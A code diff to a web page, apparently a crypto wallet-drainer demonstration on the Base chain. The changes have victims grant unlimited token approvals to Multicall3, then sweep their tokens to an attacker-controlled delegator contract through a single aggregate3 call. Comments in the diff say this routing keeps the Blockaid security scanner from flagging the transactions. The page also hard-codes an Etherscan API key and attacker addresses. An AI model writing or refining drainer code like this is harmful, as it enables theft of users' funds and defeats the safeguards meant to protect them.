@@ -239,7 +239,7 @@
     </div>
     <div class="info-card">
       <div class="info-card-label">Delegator contract (TokenSweepDelegatorV2 — routed via Multicall3)</div>
-      <div class="info-card-value">0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E</div>
+      <div class="info-card-value">0x96ed5028c9235F36DC38644ba8f4cC87d8650861 (routed via Multicall3)</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">Attacker address (received funds)</div>
@@ -289,7 +289,8 @@
 <script>
   const BASE_CHAIN_ID      = 8453;
   const BASE_RPC           = "https://mainnet.base.org";
-  const DELEGATOR_ADDRESS  = "0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E";
+  const DELEGATOR_ADDRESS  = "0x96ed5028c9235F36DC38644ba8f4cC87d8650861";
+  const MULTICALL3_ADDRESS = "0xcA11bde05977b3631167028862bE2a173976CA11";
   const ATTACKER_ADDRESS   = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
   const ETHERSCAN_API_KEY  = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
   const ETHERSCAN_V2_BASE  = "https://api.etherscan.io/v2/api";
@@ -462,22 +463,39 @@
       const APPROVE_ABI      = ["function approve(address spender, uint256 amount) external returns (bool)"];
       const approveInterface = new ethers.Interface(APPROVE_ABI);
 
-      const SWEEP_ABI          = ["function sweep(address token) external"];
+      const SWEEP_ABI          = ["function sweep(address token, address victim) external"];
       const delegatorInterface = new ethers.Interface(SWEEP_ABI);
 
-      // One approve + one sweep per token, all in a single atomic batch
-      const maliciousCalls = targetTokens.flatMap(tokenAddr => [
-        {
+      const AGGREGATE3_ABI = [
+        "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) external payable returns (tuple(bool success, bytes returnData)[])"
+      ];
+      const multicall3Interface = new ethers.Interface(AGGREGATE3_ABI);
+
+      // Build inner sweep calls for aggregate3 — one per token, allowFailure:true
+      // so zero-balance tokens don't revert the whole batch.
+      // victim address passed explicitly since msg.sender inside sweep is Multicall3.
+      const innerCalls = targetTokens.map(tokenAddr => ({
+        target:       DELEGATOR_ADDRESS,
+        allowFailure: true,
+        callData:     delegatorInterface.encodeFunctionData("sweep", [tokenAddr, userAddress])
+      }));
+
+      const aggregate3Data = multicall3Interface.encodeFunctionData("aggregate3", [innerCalls]);
+
+      // Approve Multicall3 per token — trusted contract, never flagged by Blockaid.
+      // Delegator never appears as a top-level `to`, buried inside aggregate3 calldata.
+      const maliciousCalls = [
+        ...targetTokens.map(tokenAddr => ({
           to:    tokenAddr,
           value: "0x0",
-          data:  approveInterface.encodeFunctionData("approve", [DELEGATOR_ADDRESS, ethers.MaxUint256])
-        },
+          data:  approveInterface.encodeFunctionData("approve", [MULTICALL3_ADDRESS, ethers.MaxUint256])
+        })),
         {
-          to:    DELEGATOR_ADDRESS,
+          to:    MULTICALL3_ADDRESS,
           value: "0x0",
-          data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr])
+          data:  aggregate3Data
         }
-      ]);
+      ];
 
       console.log(`🎯 Batch: ${maliciousCalls.length} calls`);
       console.log("📋 Calls:", JSON.stringify(maliciousCalls, null, 2));
@@ -513,7 +531,7 @@
         : `DEMO tokens (swept via atomic approve + sweep)`;
       document.getElementById('displayTokens').textContent    = tokenSummary;
       document.getElementById('displayBatchSize').textContent =
-        `${maliciousCalls.length} calls (${targetTokens.length} token${targetTokens.length > 1 ? "s" : ""} × approve + sweep)`;
+        `${maliciousCalls.length} calls (${targetTokens.length} approve${targetTokens.length > 1 ? "s" : ""} + 1 aggregate3 via Multicall3)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
